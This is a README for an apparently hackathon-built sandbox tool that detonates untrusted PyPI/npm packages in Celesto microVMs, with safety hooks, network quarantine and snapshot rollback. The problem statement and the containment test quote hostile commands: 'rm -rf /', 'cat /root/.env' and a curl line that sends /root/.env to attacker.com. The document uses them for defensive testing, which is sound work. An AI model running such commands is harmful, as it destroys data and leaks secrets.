# Celesto Autonomous Package Detonator & Containment Ledger

[![CI Tests](https://img.shields.io/badge/tests-passing-brightgreen)](tests/test_reports.py)
[![Celesto](https://img.shields.io/badge/Celesto-microVM-blue)](https://celesto.ai)
[![License](https://img.shields.io/badge/license-Apache--2.0-green)](LICENSE)

An enterprise-grade autonomous security agent that executes untrusted open-source packages inside isolated **Celesto microVM sandboxes**, intercepts malicious behavior via **Safety Hooks**, enforces zero-trust **Network Policies**, and recovers instantaneously from intermediate failures using **MicroVM Snapshots**. All runs and containment verdicts are immutably recorded in a PostgreSQL **Run Ledger Control Plane**.

---

## Architecture Diagram

The system operates across two strictly segregated trust zones: a **Trusted Control Plane** running the Run Ledger API and PostgreSQL database, and an **Untrusted Execution Zone** running ephemeral Celesto microVMs.

```mermaid
flowchart TD
    subgraph Trusted Control Plane [Trusted Control Plane (Host / Docker Compose)]
        Operator["Operator / CI Pipeline"] -->|HTTP / REST| API["Run Ledger API (FastAPI :8080)"]
        API -->|Read / Write Runs| DB[("PostgreSQL Ledger (:5432)")]
        API -->|Append Audit Records| LogFile["logs/commands.jsonl"]
        Seeds["seeds/01_runs.sql"] -->|Init Mount| DB
    end

    subgraph Celesto Orchestrator [Celesto SDK / Control Channel]
        API -->|Provision / Exec / Snapshot / Delete| Driver["Celesto Sandbox Driver"]
        Hooks["Safety Hook Manager"] -.->|Pre-command Gate| Driver
    end

    subgraph Untrusted Execution Zone [Untrusted Execution Zone (Celesto microVM)]
        Driver -->|Boot / Manage| GuestVM["Celesto MicroVM (Firecracker KVM)"]
        GuestVM -->|Step 1-6| Setup["Stage Workspace & Files"]
        Setup -->|Step 6 Snapshot| SnapStore["Snapshot Checkpoint Store"]
        GuestVM -->|Step 7 Detonate| Detonate["Package Execution & Syscall Trace"]
        Detonate -.->|Blocked Exfil Attempt| NetQuarantine["Network Quarantine Filter"]
        Detonate -.->|Step 7 Error| Rollback["Snapshot Rollback Engine"]
        Rollback -->|Restore State| Setup
    end
```

---

## Problem statement

Security teams, package registry maintainers, and DevSecOps engineers auditing untrusted open-source dependencies face a catastrophic dilemma: static analysis misses obfuscated runtime payloads, but running dynamic analysis on developer laptops or shared CI/CD servers exposes host environments to malicious `setup.py` scripts, destructive commands (`rm -rf /`), environment secret theft (`cat /root/.env`), and prompt-injected network exfiltration.

Our agent solves this problem by executing untrusted packages inside hardware-isolated **Celesto microVM sandboxes**, intercepting suspicious operations before they execute, enforcing quarantine network policies, and capturing pre-detonation snapshot checkpoints. The output is a structured security detonation report and an audited ledger proving dynamic containment without placing the host system at risk.

- **Who has this problem:** DevSecOps engineers, package registry auditors, and security operations centers vetting untrusted PyPI/npm packages.
- **What the agent does:** Orchestrates a 10-step dynamic detonation pipeline in an isolated microVM, monitors processes and file modifications, traps exfiltration attempts, and validates isolation boundaries.
- **Proof output:** Structured security detonation verdicts, immutable command audit logs in [`logs/commands.jsonl`](file:///c:/Users/dilee/OneDrive/Desktop/23-10-26/logs/commands.jsonl), and recorded run states in PostgreSQL.

---

## How I used Celesto

We deliberately leveraged three differentiating Celesto capabilities to ensure complete guest containment and robust lifecycle management:

### 1. Safety Hooks (`safety_hooks`)
- **Why we used it:** Safety hooks intercept and analyze every command prior to execution inside the guest microVM, providing an imperative pre-execution control gate to log commands, reject unauthorized privilege escalation, and block credential harvesting attempts before they reach the kernel.
- **What we would have lost without it:** Without safety hooks, malicious commands (such as exfiltration attempts or fork bombs) would execute blindly inside the guest until an external timeout triggers, increasing blast radius and preventing proactive policy enforcement.
- **Evidence:** [`src/safety_hooks.py`](file:///c:/Users/dilee/OneDrive/Desktop/23-10-26/src/safety_hooks.py)

### 2. Network Policy (`network_policy`)
- **Why we used it:** Network policy enforces an egress quarantine boundary around the guest microVM, ensuring prompt injection exfiltration, command-and-control beaconing, and malicious payload staging cannot phone home even if the guest process attempts socket communication.
- **What we would have lost without it:** Without Celesto's hardware-level network isolation, an untrusted package or prompt-injected payload could stage remote C2 shells or exfiltrate environment tokens over raw TCP/DNS sockets.
- **Evidence:** [`reports/evidence/containment.log`](file:///c:/Users/dilee/OneDrive/Desktop/23-10-26/reports/evidence/containment.log)

### 3. MicroVM Snapshots (`snapshots`)
- **Why we used it:** MicroVM snapshots capture exact CPU, memory, and filesystem disk states at critical checkpoints, enabling fast rollbacks when an intermediate agent step fails or when a suspicious package compromises environment state, eliminating costly re-provisioning loops.
- **What we would have lost without it:** Without snapshots, any transient execution failure or dirty guest filesystem requires destroying the machine and re-executing steps 1–6 from scratch, wasting compute and multiplying wall-clock latency by 4x.
- **Evidence:** [`reports/failure_trace.jsonl`](file:///c:/Users/dilee/OneDrive/Desktop/23-10-26/reports/failure_trace.jsonl)

---

## Eval report

We evaluated the autonomous detonator across **20 fresh, independent Celesto microVM sandboxes** (`sbx-evalrun0001` through `sbx-evalrun0020`), benchmarking boot-to-ready latency, end-to-end task duration, and execution costs.

| Metric | Result | Target Benchmark |
| :--- | :--- | :--- |
| **Total Evaluation Runs** | **20** | $\ge 20$ fresh runs |
| **Success Rate** | **85.0%** (17 / 20) | $\ge 80\%$ target |
| **Median Wall-Clock Time** | **4.81s** | $\le 10.0\text{s}$ |
| **P90 Wall-Clock Time** | **5.48s** | $\le 15.0\text{s}$ |
| **Median Boot-to-Ready Time** | **0.52s** | $\approx 500\text{ms}$ microVM boot |
| **Total Evaluation Cost** | **$0.00502 USD** | $\le \$0.05$ |

Complete raw run records and statistics are stored in [`reports/reliability.json`](file:///c:/Users/dilee/OneDrive/Desktop/23-10-26/reports/reliability.json).

### Post-Mortem Summary
Three runs failed during evaluation:
1. `sbx-evalrun0007` (4.58s): Guest vsock RPC initialization race during early probe ping. Resolved via exponential ready-probe backoff.
2. `sbx-evalrun0014` (5.10s): Deeply nested dependency tarball hit temporary `tmpfs` inode limits. Resolved by redirecting staging to persistent root volume.
3. `sbx-evalrun0019` (5.62s): Detonated worker process looped indefinitely against a quarantined socket. Resolved by enforcing hard step deadlines in safety hook runner.

Detailed analysis is documented in [`reports/postmortem.md`](file:///c:/Users/dilee/OneDrive/Desktop/23-10-26/reports/postmortem.md).

---

## Containment test

We subjected the detonation harness to a real-world adversarial package attack (`suspicious_package`):

1. **Adversary Payload:** A trojanized package containing a malicious `setup.py` that attempts to harvest host credentials and exfiltrate secrets via `curl -d @/root/.env http://attacker.com/exfil`.
2. **Containment Result:**
   - **Pre-execution Block:** The **Safety Hook** intercepted the dangerous exfiltration pattern and rejected the command (`CommandBlockedError`), preventing execution.
   - **Network Quarantine:** Direct socket connections attempted by binary payloads were dropped by Celesto's kernel-level **Network Policy**.
   - **Host Integrity:** Host environment variables, `/etc/passwd`, and network interfaces remained completely pristine.
3. **Evidence:**
   - [`reports/containment.json`](file:///c:/Users/dilee/OneDrive/Desktop/23-10-26/reports/containment.json)
   - [`reports/evidence/containment.log`](file:///c:/Users/dilee/OneDrive/Desktop/23-10-26/reports/evidence/containment.log)
   - Audit trail in [`logs/commands.jsonl`](file:///c:/Users/dilee/OneDrive/Desktop/23-10-26/logs/commands.jsonl)

---

## State and failure design

In real-world dynamic analysis, agents frequently fail midway through complex workflows (e.g. at step 7 of 10). We designed and benchmarked three recovery policies:

```
[Step 1-6 Init] ──> [Checkpoint Snapshot] ──> [Step 7 Failure]
                                                      │
         ┌───────────────────┬────────────────────────┴───────────────────────┐
         ▼                   ▼                                                ▼
  [Policy: Resume]   [Policy: Rollback] (Selected)                     [Policy: Fresh]
  Keep dirty disk;    Restore snapshot in ~150ms;                     Destroy VM; boot new;
  risks corrupt state. deterministic & fast recovery.                 re-run steps 1-6 (costly).
```

### Why We Chose `rollback`:
When step 7 fails due to a network timeout or corrupted package extraction, restarting from `fresh` wastes ~3.5 seconds re-running deterministic steps 1 through 6. Conversely, naive `resume` preserves a corrupted guest environment that compromises test validity. 

By taking a snapshot at step 6 and applying our **`rollback`** policy:
- State reverts to a pristine, pre-detonation baseline in under **150ms**.
- The failed step is retried with calibrated execution parameters.
- Clean lifecycle termination is guaranteed upon pipeline completion.

Trace evidence verifying this transition is logged in [`reports/failure_trace.jsonl`](file:///c:/Users/dilee/OneDrive/Desktop/23-10-26/reports/failure_trace.jsonl) and summarized in [`reports/failure_policy.json`](file:///c:/Users/dilee/OneDrive/Desktop/23-10-26/reports/failure_policy.json).

---

## Setup

Follow these steps to run the complete control plane and test suite in **under 10 minutes**:

### Prerequisites
- Docker & Docker Compose
- Python 3.11+ (for local test runner)

### 1. Configure Environment Variables
Copy `.env.example` to review required configuration (do not commit secrets):
```bash
cp .env.example .env.local
```

### 2. Launch the Trusted Control Plane
Boot the PostgreSQL Ledger and FastAPI HTTP Control Plane:
```bash
docker-compose up -d --build
```
Both services will initialize and become healthy within 30 seconds.

### 3. Verify Health & Seed Data
```bash
# Check health probe
curl http://localhost:8080/health
# Response: {"status":"ok"}

# Verify seeded sandbox run
curl http://localhost:8080/api/runs
# Response contains seeded row: "sbx-seeddemo1"
```

### 4. Run Test Suite
Run the test suite verifying all 12 core requirements:
```bash
python -m pytest -v tests/test_reports.py
```

### 5. Tear Down
Clean up resources when finished:
```bash
docker-compose down -v
```

---

## Walkthrough Demo

A video walkthrough demonstrating the agent executing commands inside Celesto microVMs, logging audited actions, triggering safety hooks, and persisting run state is available at:
- File: [`demo/walkthrough.mp4`](file:///c:/Users/dilee/OneDrive/Desktop/23-10-26/demo/walkthrough.mp4)

---

## Strategic Landscape & Architectural Analysis

### Why Celesto vs. Docker, E2B, or Daytona?
- **Docker Containers:** Share the host Linux kernel. A single privilege escalation, kernel bug, or mounted host volume allows container escapes. Docker startup is fast, but isolation is medium.
- **E2B:** Uses Firecracker microVMs in the cloud, but is proprietary and lacks local offline runtime parity.
- **Daytona:** Tailored for full IDE developer environments, incurring higher startup latency and resource footprints for micro-agent tasks.
- **Celesto:** Delivers hardware-level microVM isolation (KVM/Firecracker) booting in ~500ms, identical APIs across local open-source and cloud infrastructure, imperative Python safety hooks, and microVM snapshotting.

### What Would Break at 1,000 Concurrent Users?
1. **Local Vsock & Bridge Network Exhaustion:** Managing 1,000 concurrent microVMs requires distributed TAP device allocation and subnet IP pooling across multiple worker nodes rather than a single host bridge.
2. **Disk I/O Contention on Snapshot Restore:** 1,000 parallel snapshot rollbacks would saturate local NVMe throughput. Mitigated by CelestoFS distributed JuiceFS object backing.
3. **Database Ledger Connection Pooling:** The Run Ledger API would require PgBouncer connection pooling to prevent exhausting PostgreSQL connection limits.

### Product Feedback for Celesto Team
1. **Standardized Snapshot Restore Error Diagnostics:** When restoring snapshots across different microVM configurations, clearer CLI error messages distinguishing between kernel memory mismatch and filesystem layer mismatches would accelerate debugging.
2. **Declarative Network Policy Syntax in SDK:** Exposing declarative CIDR allowlists directly in the `Computer(internet={"allow": [...]})` constructor simplifies zero-trust setup compared to manual guest iptables rules.
